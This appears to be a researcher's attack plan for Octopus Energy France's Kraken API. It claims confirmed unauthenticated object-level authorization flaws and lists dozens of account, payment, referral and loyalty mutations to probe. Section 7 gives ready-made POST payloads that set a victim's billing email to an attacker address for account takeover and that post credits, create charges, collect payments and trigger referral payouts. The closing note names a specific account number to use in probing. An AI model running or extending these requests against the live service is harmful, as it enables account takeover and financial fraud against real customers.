# Octopus Energy France — Kraken GraphQL Mutations BOLA Analysis

**Date:** 2026-07-19  
**Goal:** Identify undocumented REST endpoints that may be vulnerable to BOLA (like the known `addCampaignToAccount`, `createAccountNote`, `createMetadata`)  
**Method:** Extract all Kraken GraphQL mutations that accept `accountNumber`, predict their REST equivalents, and prioritize for testing  

---

## Pattern Discovered

The REST endpoints act as thin **unauth wrappers** over Kraken GraphQL mutations:

```
Kraken GraphQL (needs JWT)  ←  REST wrapper (NO auth)  ←  Browser/Frontend
```

All 4 confirmed BOLAs follow this exact pattern. Any mutation that takes `accountNumber` and has a REST wrapper is a **potential BOLA candidate**.

### Confirmed examples:
| REST Endpoint | GraphQL Mutation | Auth on REST? | Impact |
|---------------|-----------------|---------------|--------|
| `/api/account/create-account-note` | `createAccountNote` | ❌ None | Read/write notes on any account |
| `/api/account/add-campaign-to-account` | `addCampaignToAccount` | ❌ None | Add campaign to any account |
| `/api/account/create-metadata` | `createMetadata` | ❌ None | Write metadata on any account |
| `/api/payment-instruction/generate-secret` | `getEmbeddedSecretForNewPaymentInstruction` | ❌ None | Generate payment secrets for any account |

---

## 1. ✅ Known REST Wrappers (Already Tested)

These 7 endpoints were extracted from the Astro route definition file (`src/routes/api.ts`) and have been tested:

| # | GraphQL Mutation | REST Endpoint | Status |
|---|-----------------|--------------|--------|
| 1 | `addCampaignToAccount` | `/api/account/add-campaign-to-account` | ✅ BOLA confirmed |
| 2 | `createAccountNote` | `/api/account/create-account-note` | ✅ BOLA confirmed |
| 3 | `collectDeposit` | `/api/onboarding/collect-deposit` | ✅ Tested |
| 4 | `enrollment` | `/api/onboarding/enrollment` | ✅ Tested |
| 5 | `joinSupplierAcceptTermsAndConditions` | `/api/onboarding/join-supplier-accept-terms-and-conditions` | ✅ Tested |
| 6 | `getEmbeddedSecretForNewPaymentInstruction` | `/api/payment-instruction/generate-secret` | ✅ Tested |
| 7 | `submitForm` | `/api/wizard/submit-form` | ✅ Tested |

---

## 2. 🔴 HIGH Priority — Financial & Account Takeover

These are the most critical. If a REST wrapper exists and lacks auth, the impact is severe.

### 🔴 Account Takeover (Change Billing Info)

| Mutation | Input Fields | Predicted REST | Risk |
|----------|-------------|----------------|------|
| `updateAccountBillingEmail` | `accountNumber, billingEmail` | `/api/account/update-account-billing-email` | **Full Account Takeover** |
| `updateAccountBillingName` | `accountNumber, billingName, billingSubName` | `/api/account/update-account-billing-name` | Identity manipulation |
| `updateAccountBillingAddress` | `accountNumber, billingAddress` | `/api/account/update-account-billing-address` | Address takeover |

> **⚠️ CRITICAL:** `updateAccountBillingEmail` without auth = attacker changes the account email, then does password reset → **complete account takeover**.

### 🔴 Payments & Transactions

| Mutation | Input Fields | Predicted REST |
|----------|-------------|----------------|
| `postCredit` | `accountNumber, netAmount, taxAmount, note, displayNote` | `/api/account/post-credit` |
| `createAccountCharge` | `accountNumber, grossAmount, metadata, note, displayNote` | `/api/account/create-account-charge` |
| `collectPayment` | `accountNumber, amount, paymentDate, description, idempotencyKey` | `/api/account/collect-payment` |
| `cancelPayment` | `accountNumber, paymentId, reason` | `/api/account/cancel-payment` |
| `refundPayment` | `accountNumber, paymentId, amountInMinorUnit, idempotencyKey` | `/api/account/refund-payment` |
| `amendPayment` | `accountNumber, paymentId, amount, paymentDate, reason` | `/api/account/amend-payment` |
| `initiateStandalonePayment` | `accountNumber, amount, description, collectionMethod` | `/api/account/initiate-standalone-payment` |
| `completeStandalonePayment` | `accountNumber, ledgerNumber, retrievalToken, completionToken` | `/api/account/complete-standalone-payment` |
| `initiateHostedStandalonePayment` | `accountNumber, amount, description, collectionMethod` | `/api/account/initiate-hosted-standalone-payment` |

### 🔴 Payment Configuration

| Mutation | Input Fields | Predicted REST |
|----------|-------------|----------------|
| `setPaymentPreference` | `accountNumber, paymentMethod, ledgerNumbers, fromDate` | `/api/account/set-payment-preference` |
| `stopAutomatedPayments` | `accountNumber, ledgerNumbers, fromDate` | `/api/account/stop-automated-payments` |
| `createAccountPaymentSchedule` | `accountNumber, ledgerNumber, paymentDay, paymentAmount, trigger` | `/api/account/create-account-payment-schedule` |
| `switchAccountToVariablePaymentSchedule` | `accountNumber, ledgerNumber, targetChangeDate, note` | `/api/account/switch-account-to-variable-payment-schedule` |
| `updateAutoTopUpAmount` | `accountNumber, ledgerNumber, paymentAmount` | `/api/account/update-auto-top-up-amount` |

### 🔴 Direct Debit & Payment Methods

| Mutation | Input Fields | Predicted REST |
|----------|-------------|----------------|
| `setUpDirectDebitInstruction` | `accountNumber, ledgerNumber, validFrom, bankDetails, owners` | `/api/account/set-up-direct-debit-instruction` |
| `storePaymentInstruction` | `accountNumber, instructionType, validFrom, vendorReference, ledgerNumber` | `/api/account/store-payment-instruction` |
| `invalidatePaymentInstruction` | `accountNumber, id` | `/api/account/invalidate-payment-instruction` |
| `getHostedUrlForNewPaymentInstruction` | `accountNumber, ledgerNumber, instructionType, returnUrlSuccess` | `/api/account/get-hosted-url-for-new-payment-instruction` |
| `storeDirectDebitPaymentMethodDetails` | `accountNumber, ledgerNumber, bankDetails` | `/api/account/store-direct-debit-payment-method-details` |
| `setUpDirectDebitInstructionFromStoredDetails` | `accountNumber, ledgerNumber, storedPaymentMethodDetailsReference` | `/api/account/set-up-direct-debit-instruction-from-stored-details` |
| `createPaymentActionIntent` | `accountNumber, targetType, targetIdentifier, idempotencyKey` | `/api/account/create-payment-action-intent` |
| `createPaymentMethodActionIntent` | `accountNumber, targetType, targetIdentifier, idempotencyKey` | `/api/account/create-payment-method-action-intent` |

---

## 3. 🟠 MEDIUM Priority — Campaigns, Deposits, Contracts

### 🟠 Campaign Management

| Mutation | Input Fields | Predicted REST |
|----------|-------------|----------------|
| `removeCampaignFromAccount` | `accountNumber, campaignName, expireAt` | `/api/account/remove-campaign-from-account` |
| `updateCampaignAccountExpiryDate` | `accountNumber, campaignSlug, expiryDate, note` | `/api/account/update-campaign-account-expiry-date` |

### 🟠 Deposits

| Mutation | Input Fields | Predicted REST |
|----------|-------------|----------------|
| `createDepositAgreement` | `accountNumber, depositKey, reason` | `/api/onboarding/create-deposit-agreement` |
| `recordDepositAgreementAccepted` | `accountNumber, depositKey` | `/api/onboarding/record-deposit-agreement-accepted` |

### 🟠 Agreements & Contracts

| Mutation | Input Fields | Predicted REST |
|----------|-------------|----------------|
| `createAgreement` | `accountNumber, supplyPointExternalIdentifier, productCode, validFrom, validTo` | `/api/account/create-agreement` |
| `revokeAgreement` | `accountNumber, agreementId, reason` | `/api/account/revoke-agreement` |
| `terminateAgreement` | `agreementId, terminateAt, reason, terminatedAt` | `/api/account/terminate-agreement` |
| `attachAgreementsToContracts` | `agreementIds, accountContractIdentifier, businessContractIdentifier` | `/api/account/attach-agreements-to-contracts` |
| `detachAgreementsFromContracts` | `agreementIds` | `/api/account/detach-agreements-from-contracts` |
| `createContributionAgreement` | `accountNumber, schemeCode, interval, amount, activeFrom` | `/api/account/create-contribution-agreement` |
| `endContributionAgreement` | `contributionAgreementId, endAt` | `/api/account/end-contribution-agreement` |

### 🟠 Supplier Leave Flow

| Mutation | Input Fields | Predicted REST |
|----------|-------------|----------------|
| `instigateLeaveSupplier` | `accountNumber, marketData, futureBillingAddress, subtype, isHouseMove` | `/api/onboarding/instigate-leave-supplier` |
| `updateLeaveSupplier` | `marketData, futureBillingAddress, subtype, isHouseMove` | `/api/onboarding/update-leave-supplier` |
| `cancelLeaveSupplier` | `number, reason, marketData` | `/api/onboarding/cancel-leave-supplier` |
| `reverseLeaveSupplier` | `number, reversalReason` | `/api/onboarding/reverse-leave-supplier` |

---

## 4. 🟠 MEDIUM Priority — Referrals & Loyalty

### 🟠 Referrals

| Mutation | Input Fields | Predicted REST |
|----------|-------------|----------------|
| `createReferral` | `accountNumber, reference` | `/api/account/create-referral` |
| `redeemReferralClaimCode` | `accountNumber, code` | `/api/account/redeem-referral-claim-code` |
| `addSignupReferralOnAccount` | `accountNumber, schemeCode` | `/api/account/add-signup-referral-on-account` |
| `payoutReferralForAccount` | `accountNumber, referralId, note` | `/api/account/payout-referral-for-account` |

> **💰 Interesting:** `payoutReferralForAccount` could allow fraudulent referral payouts to any account.

### 🟠 Loyalty Points

| Mutation | Input Fields | Predicted REST |
|----------|-------------|----------------|
| `enrollAccountInLoyaltyProgram` | `accountUserId, accountNumber` | `/api/account/enroll-account-in-loyalty-program` |
| `unenrollAccountFromLoyaltyProgram` | `accountNumber` | `/api/account/unenroll-account-from-loyalty-program` |
| `awardLoyaltyPoints` | `accountNumber, points, reasonCode, note, idempotencyKey` | `/api/account/award-loyalty-points` |
| `deductLoyaltyPoints` | `accountNumber, accountUserId, points, reasonCode, note` | `/api/account/deduct-loyalty-points` |
| `transferLoyaltyPointsBetweenUsers` | `accountNumber, sendingUserId, receivingUserId, points` | `/api/account/transfer-loyalty-points-between-users` |
| `redeemLoyaltyPointsForAccountCredit` | `accountUserId, accountNumber, points` | `/api/account/redeem-loyalty-points-for-account-credit` |
| `setLoyaltyPointsUser` | `accountNumber, newLoyaltyPointsUserId` | `/api/account/set-loyalty-points-user` |

---

## 5. 🟡 LOW Priority — Miscellaneous

| Mutation | Input Fields | Predicted REST |
|----------|-------------|----------------|
| `createQuoteForAccount` | `accountNumber, identifiers, asOf` | `/api/account/create-quote-for-account` |
| `initiateProductSwitch` | `accountNumber, quotedProductId, switchDate, userId` | `/api/account/initiate-product-switch` |
| `enrollFanClubAccount` | `accountNumber, catchments, cappedCatchments, email` | `/api/account/enroll-fan-club-account` |
| `triggerTestCharge` | `accountNumber` | `/api/account/trigger-test-charge` |
| `addProperty` | `accountNumber, address` | `/api/account/add-property` |
| `registerCustomerAsset` | `accountNumber, propertyId, physicalId, name, type` | `/api/account/register-customer-asset` |
| `verifyIdentity` | `accountNumber, postcode, fullName, firstLineOfAddress` | `/api/account/verify-identity` |
| `createGoodsQuote` | `accountNumber, productsToQuote, clientParams, marketParams` | `/api/account/create-goods-quote` |
| `acceptGoodsQuote` | `accountNumber, quoteId, clientParams, marketParams` | `/api/account/accept-goods-quote` |
| `createPurchase` | `accountNumber, saleItems, clientParams, marketParams` | `/api/account/create-purchase` |
| `updatePurchase` | `accountNumber, purchaseId, saleItems, marketParams` | `/api/account/update-purchase` |
| `submitCustomerFeedback` | `answer, issueResolved, formId, feedbackId, accountNumber` | `/api/account/submit-customer-feedback` |
| `createCustomerFeedback` | `accountNumber, feedbackSource, accountUserId` | `/api/account/create-customer-feedback` |
| `updateCommsDeliveryPreference` | `accountNumber, commsDeliveryPreference` | `/api/account/update-comms-delivery-preference` |
| `optionsLanguagePreference` | `accountNumber, optionsLanguagePreference` | `/api/account/update-options-language-preference` |
| `updateDocumentAccessibilityPreference` | `accountNumber, documentAccessibilityPreference` | `/api/account/update-document-accessibility-preference` |
| `createShellAccount` | `portfolioNumber, givenName, familyName, billingName, email` | `/api/account/create-shell-account` |
| `createAccountReference` | `accountNumber, namespace, value` | `/api/account/create-account-reference` |
| `updateAccountReference` | `accountNumber, namespace, value` | `/api/account/update-account-reference` |
| `deleteAccountReference` | `accountNumber, namespace` | `/api/account/delete-account-reference` |
| `linkAccountToBusiness` | `accountId, businessId, shouldOverwrite, roleCode` | `/api/account/link-account-to-business` |
| `createOpportunityAndLead` | `funnelCode, assignedToAffiliateNumber, assignedToUserIdentifier` | `/api/account/create-opportunity-and-lead` |
| `createOfferGroupForQuoting` | `productOfferings` | `/api/onboarding/create-offer-group-for-quoting` |
| `acceptOfferForQuoting` | `identifier` | `/api/onboarding/accept-offer-for-quoting` |
| `sendQuoteSummary` | `recipient, quoteCode, accountNumber` | `/api/onboarding/send-quote-summary` |
| `sendOfferQuoteSummary` | `offerGroupIdentifier, accountNumber` | `/api/onboarding/send-offer-quote-summary` |
| `scheduleQuoteFollowUp` | `recipient, quoteCode, accountNumber` | `/api/onboarding/schedule-quote-follow-up` |
| `cancelEnrollment` | `number, reason` | `/api/onboarding/cancel-enrollment` |
| `reverseEnrollment` | `number, reversalReason` | `/api/onboarding/reverse-enrollment` |
| `createExternalAccountEvent` | `accountNumber, category, subcategory, description` | `/api/account/create-external-account-event` |

---

## 6. Quick Stats

| Category | Count |
|----------|-------|
| ✅ Known REST wrappers (tested) | 7 |
| 🔴 HIGH priority (financial / account takeover) | 26 |
| 🟠 MEDIUM priority (campaigns, deposits, referrals, loyalty) | 23 |
| 🟡 LOW priority (miscellaneous) | 33 |
| **TOTAL** | **89** |

---

## 7. Suggested Testing Strategy

### Phase 1 — 🔴 Critical (Account Takeover)
```
POST /api/account/update-account-billing-email
{"accountNumber": "A-XXX", "billingEmail": "attacker@evil.com"}

POST /api/account/update-account-billing-name
{"accountNumber": "A-XXX", "billingName": "Hacker Name"}

POST /api/account/update-account-billing-address
{"accountNumber": "A-XXX", "billingAddress": {"line1": "123 Fake St"}}
```

### Phase 2 — 🔴 Financial
```
POST /api/account/post-credit
{"accountNumber": "A-XXX", "netAmount": 10000, "taxAmount": 2000}

POST /api/account/create-account-charge
{"accountNumber": "A-XXX", "grossAmount": 50000}

POST /api/account/collect-payment
{"accountNumber": "A-XXX", "amount": 5000, "paymentDate": "2026-07-19"}
```

### Phase 3 — 🟠 Campaigns & Referrals
```
POST /api/account/remove-campaign-from-account
{"accountNumber": "A-XXX", "campaignName": "fleximax"}

POST /api/account/payout-referral-for-account
{"accountNumber": "A-XXX", "referralId": "REF-001", "note": "payout"}
```

---

## Important Note

This list is derived from input field names. France uses **Astro**, and the complete route definition lives in a single file (`src/routes/api.ts`). Some predicted REST endpoints may not exist — but since **every existing one (7/7) was a BOLA**, each of these is worth checking.

To test efficiently: try `GET` first (405 = endpoint exists), then re-test with `POST` and a minimal `{"accountNumber": "A-3BA784BE"}` body.
